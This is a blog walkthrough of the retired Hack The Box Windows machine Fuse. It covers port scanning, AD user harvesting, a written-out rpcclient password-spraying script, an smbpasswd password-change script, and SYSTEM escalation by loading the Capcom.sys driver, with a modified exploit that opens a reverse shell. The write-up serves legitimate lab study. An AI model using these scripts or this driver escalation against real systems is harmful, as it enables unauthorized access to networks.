---
layout: post  
title: "Fuse: Hack The Box Walkthrough"
date: 2020-11-01 11:31:14 +0000
last_modified_at: 2020-11-01 11:31:14 +0000
category: Walkthrough
tags: ["Hack The Box", Fuse, retired, Windows, Medium]
comments: true
protect: false
image:
  feature: fuse-htb-walkthrough.png
---

This post documents the complete walkthrough of Fuse, a retired vulnerable [VM][1] created by [egre55][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Fuse is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.193 --rate=500

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-06-15 07:08:21 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 49667/tcp on 10.10.10.193
Discovered open port 49666/tcp on 10.10.10.193
Discovered open port 464/tcp on 10.10.10.193
Discovered open port 139/tcp on 10.10.10.193
Discovered open port 636/tcp on 10.10.10.193
Discovered open port 3269/tcp on 10.10.10.193
Discovered open port 5985/tcp on 10.10.10.193
Discovered open port 593/tcp on 10.10.10.193
Discovered open port 389/tcp on 10.10.10.193
Discovered open port 49752/tcp on 10.10.10.193
Discovered open port 49672/tcp on 10.10.10.193
Discovered open port 135/tcp on 10.10.10.193
Discovered open port 53/tcp on 10.10.10.193
Discovered open port 80/tcp on 10.10.10.193
Discovered open port 88/tcp on 10.10.10.193
Discovered open port 49670/tcp on 10.10.10.193
Discovered open port 9389/tcp on 10.10.10.193
Discovered open port 49669/tcp on 10.10.10.193
Discovered open port 3268/tcp on 10.10.10.193
Discovered open port 445/tcp on 10.10.10.193
Discovered open port 49691/tcp on 10.10.10.193
Discovered open port 53/udp on 10.10.10.193
```

Sure looks like the ports profile of a Windows Server. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -n -Pn -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -A --reason 10.10.10.193 -oN nmap.txt
...
PORT     STATE SERVICE      REASON          VERSION
53/tcp   open  domain?      syn-ack ttl 127
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
80/tcp   open  http         syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
88/tcp   open  kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2020-06-15 07:33:43Z)
135/tcp  open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds syn-ack ttl 127 Windows Server 2016 Standard 14393 microsoft-ds (workgroup: FABRICORP)
464/tcp  open  kpasswd5?    syn-ack ttl 127
593/tcp  open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped   syn-ack ttl 127
3268/tcp open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped   syn-ack ttl 127
5985/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf       syn-ack ttl 127 .NET Message Framing
...
Host script results:
|_clock-skew: mean: 2h37m21s, deviation: 4h02m32s, median: 17m19s
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Fuse
|   NetBIOS computer name: FUSE\x00
|   Domain name: fabricorp.local
|   Forest name: fabricorp.local
|   FQDN: Fuse.fabricorp.local
|_  System time: 2020-06-15T00:36:48-07:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2020-06-15T07:36:44
|_  start_date: 2020-06-15T07:07:35
```

It's a windows Server alright. Since `http` is available, let's check out the headers with `curl`.

```
# curl -i 10.10.10.193
HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Sat, 30 May 2020 00:01:51 GMT
Accept-Ranges: bytes
ETag: "2c834e851536d61:0"
Server: Microsoft-IIS/10.0
Date: Mon, 15 Jun 2020 09:05:42 GMT
Content-Length: 103

<meta http-equiv="refresh" content="0; url=http://fuse.fabricorp.local/papercut/logs/html/index.htm" />
```

Interesting. There's a redirect in `index.htm`. I'd better put `fuse.fabricorp.local` into `/etc/hosts`. This is what it looks like.

{% include image.html image_alt="e05b5a10.png" image_src="/ea197248-1338-4df2-8ef1-4492ba8ce029/e05b5a10.png" %}

### Papercut Print Logger

From the site, we can gather usernames as well as information about a new starter `bnielson`. These are the usernames I've gathered.

```
bnielson
pmerton
tlavel
sthompson
bhult
administrator
```

### SMB Enumeration

Null session didn't reveal anything interesting.

```
# smbclient -I 10.10.10.193 -L FUSE -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available
```

Well, at least we know that the Guest account is disabled.

```
# smbclient -I 10.10.10.193 -L FUSE -U'guest%'
session setup failed: NT_STATUS_ACCOUNT_DISABLED
```

### Do not require Kerberous preauthentication

Let's see if any of the users had **Do not require Kerberos preauthentication** set with Impacket's `GetNPUsers.py`.

```
# for user in $(cat usernames); do python3 GetNPUsers.py -format john -no-pass "fabricorp/$user" -dc-ip 10.10.10.193; echo; done
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for bnielson
[-] User bnielson doesn't have UF_DONT_REQUIRE_PREAUTH set

Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for pmerton
[-] User pmerton doesn't have UF_DONT_REQUIRE_PREAUTH set

Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for tlavel
[-] User tlavel doesn't have UF_DONT_REQUIRE_PREAUTH set

Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for sthompson
[-] User sthompson doesn't have UF_DONT_REQUIRE_PREAUTH set

Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for bhult
[-] User bhult doesn't have UF_DONT_REQUIRE_PREAUTH set

Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for administrator
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set

```

### Password Spraying

Well, the tried-and-true, surefire way of gaining access is password spraying. With that, I wrote a simple shell script based on `rpcclient`.

<div class="filename"><span>spray.sh</span></div>

```bash
#!/bin/bash

USER=$1
PASS=$2

function die() {
    killall perl 2>/dev/null
}

export -f die

function check() {

    local DOMAIN=fabricorp
    local HOST=10.10.10.193
    local USER=$1
    local PASS=$2

    printf "[+] %-13s: " "$USER"

    if rpcclient -U"$DOMAIN/$USER%$PASS" $HOST -c "exit" 2>/dev/null; then
        echo "Password is $PASS"
        die
    fi
}

export -f check

parallel -q check :::: $USER ::: $PASS
```

The idea is simple. I've identified `Fabricorp01` as a potential password candidate for spraying. I'm going to try this password for every username found above and see what gives.

{% include image.html image_alt="04dbb1bf.png" image_src="/ea197248-1338-4df2-8ef1-4492ba8ce029/04dbb1bf.png" %}

Looks like a few of them need to change password soon!

### Changing password with `smbpasswd`

We can automate changing of password with a shell script that's based on `smbpasswd`.

```bash
#!/bin/bash

HOST=10.10.10.193
USER=$1
OLDPASS=Fabricorp01
NEWPASS=$2

(echo $OLDPASS; echo $NEWPASS; echo $NEWPASS) \
| smbpasswd -r $HOST -U $USER \
| grep -Ev '^(Old|New|Retype)'
```

{% include image.html image_alt="4c286037.png" image_src="/ea197248-1338-4df2-8ef1-4492ba8ce029/4c286037.png" %}

### SMB Enumeration 2

I noticed that the password expires faster than I can type a command so I included SMB enumeration right after I changed password.

```
# ./changepw.sh bhult 'SLKDJ@bc123#' && smbclient -U'bhult%SLKDJ@bc123#' -I 10.10.10.193 -L FUSE
Password changed for user bhult on 10.10.10.193.

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        HP-MFT01        Printer   HP-MFT01
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        print$          Disk      Printer Drivers
        SYSVOL          Disk      Logon server share
```

`print$` should be interesting.

{% include image.html image_alt="7b3311cd.png" image_src="/ea197248-1338-4df2-8ef1-4492ba8ce029/7b3311cd.png" %}

Heck, nothing but printer drivers. Next.

### LDAP Enumeration

Using the same method, I was able to enumerate the Active Directory with Apache Directory Studio.

{% include image.html image_alt="46882b34.png" image_src="/ea197248-1338-4df2-8ef1-4492ba8ce029/46882b34.png" %}

Looks like only the members of the **IT_Accounts** group can remote in. We know now which account we should target next—`svc-print`. By the way, `sthompson` is also a member of the **Domain Admins** group

### RPC Enumeration

{% include image.html image_alt="cff62b7e.png" image_src="/ea197248-1338-4df2-8ef1-4492ba8ce029/34281b7e.png" %}

Looks like we have more users. I think I found another password for spraying during enumeration.

{% include image.html image_alt="85823f32.png" image_src="/ea197248-1338-4df2-8ef1-4492ba8ce029/85823f32.png" %}

Check it out.

{% include image.html image_alt="3e825bbf.png" image_src="/ea197248-1338-4df2-8ef1-4492ba8ce029/3e825bbf.png" %}

## Low-Privilege Shell

Armed with `svc-print`'s password (`$fab@s3Rv1ce$1`), we can finally use Evil-WinRM to get that interactive shell.

{% include image.html image_alt="ba9e7ea6.png" image_src="/ea197248-1338-4df2-8ef1-4492ba8ce029/ba9e7ea6.png" %}

As expected, the file `user.txt` is at `svc-print`'s Desktop.

{% include image.html image_alt="4929e301.png" image_src="/ea197248-1338-4df2-8ef1-4492ba8ce029/4929e301.png" %}

## Privilege Escalation

During enumeration of `svc-print`'s account, I notice a rather cryptic note at `C:\readme.txt`.

{% include image.html image_alt="13bab0d6.png" image_src="/ea197248-1338-4df2-8ef1-4492ba8ce029/13bab0d6.png" %}

More importantly, `svc-print` has the privilege to load a driver yo!

{% include image.html image_alt="b55eea09.png" image_src="/ea197248-1338-4df2-8ef1-4492ba8ce029/b55eea09.png" %}

Batteries included—I don't even need to enable it.

### Abusing SeLoadDriverPrivilege for privilege escalation

I'm following this [write-up](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/). Here's the game plan:

1. Load the malicious `Capcom.sys` driver with `EoPLoadDriver.exe`
2. Run `ExploitCapcom.exe`

#### Building the solution

I was able to build the two "solutions" with Visual Studio 2017 Community Edition. There was a complaint about Spectre mitigation libraries not found. Simply disable Spectre mitigaton at **C/C++ Compiler->Code Generation**, and we are good to go.

{% include image.html image_alt="f1c31b86.png" image_src="/ea197248-1338-4df2-8ef1-4492ba8ce029/f1c31b86.png" %}

Also, set the build target to x64 and Release.

{% include image.html image_alt="94971d14.png" image_src="/ea197248-1338-4df2-8ef1-4492ba8ce029/94971d14.png" %}

Copy `EopLoadDriver.exe` and `ExploitCapcom.exe` over to my attacking machine.

{% include image.html image_alt="2b24acf2.png" image_src="/ea197248-1338-4df2-8ef1-4492ba8ce029/2b24acf2.png" %}

### Let's go!

I'll copy `nc.exe` over to the interactive PowerShell and run `cmd.exe` over back to me because that's what I'm used to. Copy the rest of the "solutions" over as well.

{% include image.html image_alt="04975965.png" image_src="/ea197248-1338-4df2-8ef1-4492ba8ce029/04975965.png" %}

There you have it.

{% include image.html image_alt="a1b14769.png" image_src="/ea197248-1338-4df2-8ef1-4492ba8ce029/a1b14769.png" %}

#### ExploitCapcom

I should explain that I modified `ExploitCapcom.cpp` like so.

{% include image.html image_alt="451b9243.png" image_src="/ea197248-1338-4df2-8ef1-4492ba8ce029/451b9243.png" %}

The reason is simple. The original `ExploitCapcom.exe` launched a shell which upon hitting Enter exits. I modified it to launch a reverse shell instead.

#### Getting `root.txt`

Let's load `Capcom.sys` first.

{% include image.html image_alt="296b60e9.png" image_src="/ea197248-1338-4df2-8ef1-4492ba8ce029/296b60e9.png" %}

Next we launch our reverse shell.

{% include image.html image_alt="b90fa59e.png" image_src="/ea197248-1338-4df2-8ef1-4492ba8ce029/b90fa59e.png" %}

Getting `root.txt` with **NT AUTHORITY\SYSTEM** is trivial.

{% include image.html image_alt="6f4e250a.png" image_src="/ea197248-1338-4df2-8ef1-4492ba8ce029/6f4e250a.png" %}

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/256
[2]: https://www.hackthebox.eu/home/users/profile/1190
[3]: https://www.hackthebox.eu/
